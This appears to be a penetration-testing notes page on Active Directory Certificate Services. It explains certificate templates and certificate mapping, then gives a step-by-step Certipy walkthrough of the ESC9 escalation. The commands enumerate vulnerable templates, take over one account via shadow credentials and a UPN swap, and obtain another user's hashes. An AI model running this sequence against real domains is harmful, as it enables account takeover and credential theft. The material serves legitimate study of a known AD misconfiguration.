---
description: AD CS | PKI Signature | Certificate | Misconfigured | CA |
---

# Certificate templates

Active Directory Certificate Services (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols.

{% embed url="https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview" %}

In short you can think of this as a way to prove identification very much like how a Kerberos ticket works. AD CS is a server role that functions as Microsoft’s public key infrastructure PKI implementation. Some key words:

| Keyword                                            | Description                                                                                               |
| -------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| **PKI** (Public Key Infrastructure)                | a system to manage certificates/public key encryption                                                     |
| **AD CS** (Active Directory Certificate Services)  | Microsoft’s PKI implementation                                                                            |
| **CA** (Certificate Authority)                     | PKI server that issues certificates                                                                       |
| **Enterprise CA**                                  | CA integrated with AD (as opposed to a standalone CA)                                                     |
| Certificate Template                               | collection of settings and policies that defines the contents of a certificate issued by an enterprise CA |
| **CSR** (Certificate Signing Request)              | a message sent to a CA to request a signed certificate                                                    |
| **EKU** (Extended/Enhanced Key Usage)              |  object identifiers (OIDs) that define how a certificate can be used                                      |

AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. A user can request a certificate based on a predefined certifcate template. These templates specifies the settings for the final certificate, like can it be used for authentication, what properties defined, who can enroll.&#x20;

### <mark style="color:yellow;">Certifcate mapping</mark>

{% hint style="info" %}
Names like **ESC3** or **ESC9** refer to specific certificate templates that can be exploited.
{% endhint %}

There have misconfigurations found in ESC1, ESC2, ESC3, ESC8, ESC9 and ESC10. Below we will go through the ESC9 which uses certificate mapping. Certificate mapping is the part of certificate authentication where the DC takes a principal like user or computer data provided in the certificate used uring authentication, and attempts to map this to a user or computer.

#### Implicit mapping

Here the information contained in the ceritificate's SAN or Subject Alternative Name is used to match the UPN attribute or `userPrincipalName` for a user or DNS `dNSHostName` for  machine account. In case of a user account, the `otherName` component of the SAN is used, for machine `dNSName`.

If the UPN mapping fails the DC will attempt to match the username contained in `otherName` with `sAMAccountName` attribute, and then with `sAMAccountName` suffixed with `$`. Similar with DNS.

#### Explicit mapping

In case of explicit mapping, the altSecurityIdenties attribute of an account user or machine must contain identifiers of the certificates with which is authorised to authenticate. Certificate must be signed by a trusted certification authority, and match one of the values in `altSecurityidentities`.&#x20;

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption><p>Source: The Hacker Recipes. Identifiers X509 v3 certificate</p></figcaption></figure>

Read more on Hacker Recipes about weak and strong mappings and labels.[https://www.thehacker.recipes/ad/movement/adcs/certificate-templates](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates)

### <mark style="color:yellow;">Example ESC9</mark>

Microsoft has introduced the `CT_FLAG_NO_SECURITY_EXTENSION` flag for the `msPKI-Enrollment-Flag` attribute of certificate templates. If present, the CA will not include the user's SID when issuing certificates&#x20;

{% hint style="info" %}
Certipy will now check for ESC1, ESC2, ESC3, ESC4, and the new ESC9 on certificate templates.
{% endhint %}

Using certifpy we can search for vulnerabilities. ESC9 requirements:

* `SrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag (`0x4`)
* The template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
* The template specifies client authentication
* `GenericWrite` right against any account A to compromise any account B

```bash
certipy find -u 'ca_operator' -p 'newP@ssword2022' -dc-ip 10.10.11.41 -vulnerable -stdout
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption><p>Has no security extension.</p></figcaption></figure>

Get user hahes which [shadow-credentials.md](shadow-credentials.md "mention")or&#x20;

```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Next change the userPrincipalName from user2 to user3

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

Request vulnerable certificate as user2

```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template CertifiedAuthentication
```

Change user2 UPN back to something else.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Authenicate as user3 and get hashes

```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```

